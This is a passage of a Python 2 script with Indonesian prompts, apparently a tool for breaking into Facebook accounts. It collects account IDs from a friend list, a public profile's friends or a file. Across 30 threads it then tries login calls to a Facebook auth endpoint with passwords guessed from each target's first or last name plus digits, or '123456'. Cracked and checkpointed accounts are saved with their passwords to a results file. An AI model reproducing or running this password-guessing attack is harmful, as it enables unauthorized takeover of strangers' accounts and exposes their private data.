                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone Israel.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_fhilip():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;94m _________   ________.    '
    print '\x1b[1;94m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;91m  \\______  /|__|   |___  /'
    print '\x1b[1;91m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mFhilipina\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_fhilip()


def pilih_fhilip():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_fhilip()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________   ________.    '
            print '\x1b[1;94m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK FHILIPINA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________   ________.    '
            print '\x1b[1;94m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK FHILIPINA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_fhilip()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________   ________.    '
            print '\x1b[1;94m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK FHILIPINA \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_fhilip()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_fhilip()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/fhilip.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/fhilip.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/fhilip.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/fhilip.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/fhilip.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/fhilip.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/fhilip.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/fhilip.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/fhilip.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/fhilip.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/fhilip.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/fhilip.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/fhilip.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/fhilip.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/fhilip.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/fhilip.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
